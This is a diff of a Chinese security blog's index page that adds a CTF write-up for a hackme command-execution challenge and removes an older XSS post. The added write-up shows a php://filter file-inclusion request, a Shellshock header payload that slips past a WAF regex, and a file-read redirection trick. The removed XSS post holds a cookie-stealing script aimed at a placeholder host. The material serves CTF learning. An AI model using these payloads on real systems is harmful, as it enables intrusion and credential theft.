@@ -41,7 +41,7 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>25</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>26</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
       <a href="/tags"><div><strong>12</strong><br>标签</div></a>
     </div>
@@ -68,6 +68,71 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-结合CVE的一道命令执行弹shell的题目" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/01/结合CVE的一道命令执行弹shell的题目/" class="article-date">
+  <time class="post-time" datetime="2018-11-01T08:22:00.000Z" itemprop="datePublished">
+    <span class="post-month">11月</span><br>
+    <span class="post-day">01</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/01/结合CVE的一道命令执行弹shell的题目/">结合CVE的一道命令执行弹shell的题目</a>
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
+  </div>
+
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>这是hackme一道题目，这道题目结合了一个高危的cve以及弹shell的操作，从这题目学到了挺多东西的，为此把这道题目记录一下。</p>
+<h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>题目地址：<a href="https://command-executor.hackme.inndy.tw/" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/</a><br>打开发现网页有几个明显的功能：<br><img src="/images/20/1.png" alt=""><br>第一个页面是man的函数说明，第二个功能是则是上传文件，第三个功能就是输入命令执行了，但是被限制的很死，也就是说只能执行ls以及env，第四个就是ls读取文件，但是只能读取四个目录的文件，不过问题不大，可以更改file参数来更改读取目录。不过点点的时候发现了一个很明显的漏洞：<br><img src="/images/20/2.png" alt=""><br>这里很容易想到可以尝试用文件包含来读取源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
+<p>读取出index.php源码，挑出一些值得审计的代码，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pages = [</span><br><span class="line">    [&apos;man&apos;, &apos;Man&apos;],</span><br><span class="line">    [&apos;untar&apos;, &apos;Tar Tester&apos;],</span><br><span class="line">    [&apos;cmd&apos;, &apos;Cmd Exec&apos;],</span><br><span class="line">    [&apos;ls&apos;, &apos;List files&apos;],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function fuck($msg) &#123;</span><br><span class="line">    header(&apos;Content-Type: text/plain&apos;);</span><br><span class="line">    echo $msg;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    &apos;\/flag&apos;, &apos;\(\)\s*\&#123;\s*:;\s*\&#125;;&apos;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function waf($a) &#123;</span><br><span class="line">    global $black_list;</span><br><span class="line">    if(is_array($a)) &#123;</span><br><span class="line">        foreach($a as $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        foreach($black_list as $b) &#123;</span><br><span class="line">            if(preg_match(&quot;/$b/&quot;, $a) === 1) &#123;</span><br><span class="line">                fuck(&quot;$b detected! exit now.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line">function execute($cmd, $shell=&apos;bash&apos;) &#123;</span><br><span class="line">    system(sprintf(&apos;%s -c %s&apos;, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_SERVER as $key =&gt; $val) &#123;</span><br><span class="line">    if(substr($key, 0, 5) === &apos;HTTP_&apos;) &#123;</span><br><span class="line">        putenv(&quot;$key=$val&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;func&apos;])) &#123;</span><br><span class="line">    $page = $_GET[&apos;func&apos;];</span><br><span class="line">    if(strstr($page, &apos;..&apos;) !== false) &#123;</span><br><span class="line">        $page = &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($page &amp;&amp; strlen($page) &gt; 0) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        include(&quot;$page.php&quot;);</span><br><span class="line">    &#125; catch (Exception $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>审计index.php的时候，发现了一个黑名单，过滤了/flag以及(){ :; };，这个时候还并不知道有何作用，接着查看untar的源码，发现网页只是把我们上传的文件名进行解压，并没什么卵用。接下来的源码没啥利用价值。<br>根据飘零师傅的wp，飘零师傅通过观察到了env以及putenv联想到了之前的一个cve，具体的分析如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.freebuf.com/articles/system/45390.html</span><br></pre></td></tr></table></figure></p>
+<p>接着飘零师傅推荐这篇生成exp的文章:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/20/3.png" alt=""><br>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; :; &#125;; echo Hacked&quot; -q -O -  http://127.0.0.1/shock.php</span><br></pre></td></tr></table></figure></p>
+<p>接着可以对比一下之前的源码，发现出现漏洞的源码十分相似，我们可以尝试一下payload的实用性，不过之前在waf中我们看到过滤了payload的一部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$black_list = [</span><br><span class="line">    &apos;\/flag&apos;, &apos;\(\)\s*\&#123;\s*:;\s*\&#125;;&apos;</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p>
+<p>我们可以通过在:;之间加空格来绕过，所以尝试的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; echo This is a test&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/20/4.png" alt=""><br>发现成功执行了命令，那接着我们可以尝试读取一下/etc/passwd<br><img src="/images/20/5.png" alt=""><br>可以发现flag文件夹在根目录下，尝试读取一下。<br><img src="/images/20/6.png" alt=""><br>突然想起来，/flag被过滤了，这里我们用通配符绕过，但是并没有任何回显，我们用第四个功能ls看啥情况。<br><img src="/images/20/7.png" alt=""><br>发现我们没权限读取这个文件，需要root权限，但是下面flag-reader.c可以读取，我们尝试读一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;syscall.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">	char buff[4096], rnd[16], val[16];</span><br><span class="line">	if(syscall(SYS_getrandom, &amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) &#123;</span><br><span class="line">		write(1, &quot;Not enough random\n&quot;, 18);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	setuid(1337);</span><br><span class="line">	seteuid(1337);</span><br><span class="line">	alarm(1);</span><br><span class="line">	write(1, &amp;rnd, sizeof(rnd));</span><br><span class="line">	read(0, &amp;val, sizeof(val));</span><br><span class="line"></span><br><span class="line">	if(memcmp(rnd, val, sizeof(rnd)) == 0) &#123;</span><br><span class="line">		int fd = open(argv[1], O_RDONLY);</span><br><span class="line">		if(fd &gt; 0) &#123;</span><br><span class="line">			int s = read(fd, buff, 1024);</span><br><span class="line">			if(s &gt; 0) &#123;</span><br><span class="line">				write(1, buff, s);</span><br><span class="line">			&#125;</span><br><span class="line">			close(fd);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			write(1, &quot;Can not open file\n&quot;, 18);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		write(1, &quot;Wrong response\n&quot;, 16);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>看不太懂，套用一叶飘零师傅的话就是，这个命令可以1秒之内把他输出的再输入回去，就可以打出文件内容。<br>运行这个c，再把这个c输出在1s内再输回去，但是纯靠这样的交互，速度极慢，所以容易想到，要不要拿个shell？接着我们可以利用bash弹shell到我们的服务器上:<br><img src="/images/20/8.png" alt=""><br>有了shell，现在就是如何读取flag的问题了，这里借鉴了一叶飘零师傅的思路，通过找到可写入文件的目录，利用了linux下的重定向，将输出写到某个文件中，再自动输入即可，这样即可达到目的。通过ls的功能我们可以看到tmp目录可以写入，所以参考的payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; /var/tmp/flllag &lt; /var/tmp/flllag</span><br></pre></td></tr></table></figure></p>
+<p>接着读取这个文件就行了。<br>PS:记得删除自己所留下的文件，要不然可能导致题目没办法做了。不过在tmp目录下一堆别人留下的flag文件，随便读一个就行了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/01/结合CVE的一道命令执行弹shell的题目/" data-id="cjo725jd5001mqgvjwjrzkks5" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/命令执行/">命令执行</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-近期比赛学习总结" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
@@ -149,7 +214,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/15/近期比赛学习总结/" data-id="cjnbrwl8f0017cwve6fvhngbz" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/10/15/近期比赛学习总结/" data-id="cjo725jdg0025qgvjpwu2quu9" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>
@@ -202,6 +267,8 @@
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在此之前写了一篇关于getshell的文章，主要是关于一些如何绕过限制的技巧的，这一篇可以理解为上一篇的后续，主要补充一些linux下命令执行的绕过技巧，以及如何通过仅限的长度来构造shell进行执行。</p>
 <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>现在很多题目都丢在docker中，一般docker环境都是linux，所以学好linux下的命令至关重要。接下来梳理一些常用命令:<br>wget:在后面接上下载文件的地址，可以将文件下载下来。-C参数可以将文件保存为你所要的文件名。这个命令一般用来下载shell，在无法写入shell的时候可以尝试。<br>>:定向输出到文件，如果文件不存在，就创建文件；如果文件存在，就将其清空。这个一般用法是通过  echo “内容” &gt;文件名  的格式来将内容写入文件里面，一般是用来写入shell。<br>;:命令分隔符<br>…….<br>其他的命令自行查阅<a href="http://www.cnblogs.com/yjd_hycf_space/p/7730690.html" target="_blank" rel="noopener">Linux常用命令大全</a></p>
 <h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>一般来说，我们通过网页输入的命令会经过php代码的过滤以及转义处理才进而在服务器中执行，很多过滤操作也是由php代码来完成，所以很多绕过方式也是基于php环境的(例如上一篇的过滤绕过方式)。</p>
+<h3 id="命令符"><a href="#命令符" class="headerlink" title="命令符"></a>命令符</h3><p>这么说也不太贴切，主要是指`符号被过滤的情况下，具体作用在上一篇应该讲过。如果我们输入的命令被解析为字符串，那么使用这个符号就能让我们的命令被系统认为是命令来执行，所以在过滤了`这个情况下，我们如何使用其他的符号来使得我们的字符串被解析为命令呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$( 命令 )</span><br></pre></td></tr></table></figure></p>
+<p>这个就可以成功让其解析。</p>
 <h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>过滤的时候可能会通过过滤空格来阻止命令执行:<br><img src="/images/18/1.png" alt=""><br>通过测试可以看见当在过滤了空格之后cat命令是无法执行的，但是无伤大雅，图中可以看到我们可以通过几种方式来绕过:<br>&lt;<br>$IFS$9<br>${IFS}<br>$IFS在测试时发现，无法输出任何东西，主要原因是因为$IFS类似一个截断字符，具体原理也不详谈，总而言之就是将{}加入之后就能稳定的让命令执行。<br>还有一个在php环境下可以替代空格的字符%09，可以在php环境下进行测试。</p>
 <h3 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h3><p>命令分隔符简而言之就是链接两个命令的符号，在linux中最为常见的就是；，但是依旧有替代的符号可以在过滤了;的情况下进行命令分隔:<br><img src="/images/18/2.png" alt=""><br>可以看到最为基本的就是;进行分割，测试中发现|和&amp;只能起到执行后者命令的作用，看大手子的文章是说执行了但不回显，具体原理不去深究，在php环境下如下字符也是可以起到命令分隔的作用的:<br><img src="/images/18/3.png" alt=""></p>
 <h3 id="命令终止符"><a href="#命令终止符" class="headerlink" title="命令终止符"></a>命令终止符</h3><p>顾名思义就是终止命令的符号，有%00，%20也就是#的编码。</p>
@@ -213,7 +280,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/08/关于命令执行的学习/" data-id="cjnbrwl8b0014cwventdngwlr" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/10/08/关于命令执行的学习/" data-id="cjo725jdg0020qgvjf6sw8ko8" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/命令执行/">命令执行</a></li></ul>
@@ -288,7 +355,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/09/27/绕过过滤getshell的一些骚操作/" data-id="cjnbrwlcl0027cwvezqtis0rk" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/09/27/绕过过滤getshell的一些骚操作/" data-id="cjo725jdg001tqgvjg19mlaxp" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Getshell/">Getshell</a></li></ul>
@@ -352,7 +419,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/16/solve-me-后续/" data-id="cjnbrwl8p001fcwve7nu94jkh" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/08/16/solve-me-后续/" data-id="cjo725jco000tqgvj4jox0g6e" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
@@ -425,7 +492,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/02/关于代码审计的一些绕过方式/" data-id="cjnbrwl8t001icwveb1x0cjs5" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/08/02/关于代码审计的一些绕过方式/" data-id="cjo725jdd001pqgvj5lhvwcds" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
@@ -484,7 +551,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/22/近期比赛学习到的一些知识/" data-id="cjnbrwlci0025cwveqxsm3p6u" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/22/近期比赛学习到的一些知识/" data-id="cjo725jdg0023qgvjue23it9r" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>
@@ -551,7 +618,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjnbrwl8x001lcwvespm2qrs1" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjo725jco0013qgvjo9fi4vip" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
@@ -618,7 +685,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjnbrwl860011cwvev1w6jeme" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjo725jd5001eqgvj3wk4z72w" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
@@ -688,71 +755,10 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjnbrwl7s000tcwvejk6z7x31" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjo725jco0011qgvjbr7sw6jx" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-关于xss的一些学习心得" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/06/01/关于xss的一些学习心得/" class="article-date">
-  <time class="post-time" datetime="2018-06-01T10:26:17.000Z" itemprop="datePublished">
-    <span class="post-month">6月</span><br>
-    <span class="post-day">01</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/06/01/关于xss的一些学习心得/">关于xss的一些学习心得</a>
-    </h1>
-  
-
-        <div>
-          
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
-  </div>
-
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>按照惯例，开头还是逼逼几句，本来这一篇我昨天就写好了，可是处理的时候不小心删了，所以就只能重新写一篇了，关于xss呢，很早之前就接触过但是一直没系统的学，只是为了做xss的题目而做题目所以这一次系统的归纳一下，也算是个备忘录吧。  </p>
-<h2 id="何为XSS"><a href="#何为XSS" class="headerlink" title="何为XSS"></a>何为XSS</h2><p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。<strong>(摘自百度百科)</strong><br>以上的说明呢，是官方的。不过根据我的理解来说，XSS攻击是攻击者把构造的恶意代码插入到网页源码中，通过跳转，执行事件等方式来达到获取信息，执行恶意代码等目的。  </p>
-<h2 id="XSS攻击的分类"><a href="#XSS攻击的分类" class="headerlink" title="XSS攻击的分类"></a>XSS攻击的分类</h2><p>一般来说XSS攻击分为三种。<br>第一种是反射型XSS，反射性XSS只是简单地把用户输入的数据”反射”给浏览器，也就是说攻击者必须让攻击点击所构造的恶意链接才能给攻击者反馈消息或者执行非本人意愿的命令。这一种反馈是即时性的，也是一次性的，也就是即输即用，也叫做”非持久型XSS”<br>第二种是储存型XSS，储存型XSS会把攻击者所构造的恶意代码储存到后端的数据库中，只要有用户一旦浏览到恶意代码的页面便会执行攻击的代码，被窃取登入验证等信息，攻击者便可以假冒”代表”用户进行操作。<br>第三种是基于Dom的XSS，这一种XSS攻击和反射型差不多，也算是反射型的一种，这种类型的攻击一般是攻击者构造一些事件，或者调用js里面一些函数来实现的，所以具体来说这种和第一种区分不算太大。  </p>
-<h2 id="XSS一些Payload"><a href="#XSS一些Payload" class="headerlink" title="XSS一些Payload"></a>XSS一些Payload</h2><p>其实来说呢，xss的payload也不是类似sql注入一样固定的，xss的payload一般来说是变化多样，根据其html的代码来进行构造的。<br>这是最为基础，也是常用于测试的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">```  </span><br><span class="line">这里面包含了标签，也包含了alert()函数，一般来说是可以测试出一些东西的。  </span><br><span class="line">还有例如这种的payload</span><br></pre></td></tr></table></figure></p>
-<p><img scr="#" onerror="alert(1)"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这种是通过构造一个错误，触发onerror事件弹出alert(1)。   </span><br><span class="line">还有类似这种</span><br></pre></td></tr></table></figure></p>
-<p><script><br>var i=new Image;<br>i.src=”<a href="http://xxxx.xxxx.xxx&quot;+document.cookies">http://xxxx.xxxx.xxx&quot;+document.cookies</a>;<br></script><br><code>`</code><br>这种就是通过点击恶意链接，然后用户的信息就被窃取了。<br><strong>以上只是几种简单的Payload，其余的类型实在是太过复杂了，多做题目才能有更多的经验</strong>  </p>
-<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>这个就大致说一下吧，之后会在练习中讲解一些的。主要分为以下几种。<br><strong>1 编码绕过</strong>根据网页过滤的代码，以及代码执行的环境进行合适的编码转化，例如他在后台过滤<strong>&lt;&gt;</strong>这个东西，那我们可以通过%3c%3e来绕过，也可以\0x3c来绕过。<br><strong>2 字符限制</strong>一般网页会限制输入的长度，我们可以进行简化代码，也可以直接更改源码中的maxlength要素来修改字符长度上限。<br><strong>3 使用标签</strong>灵活使用标签也是可以达到同样的效果的。<br>一些其他的方式也是需要在实战中进行磨练出来的，之后会写一篇XSS练习平台的wp，详细说一些思路。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjnbrwl8i0019cwveq8p7kpah" class="article-share-link">分享</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-XSS/">Web XSS</a></li></ul>
 
     </footer>
   </div>
@@ -807,7 +813,7 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>25</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>26</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
       <a href="/tags"><div><strong>12</strong><br>标签</div></a>
     </div>
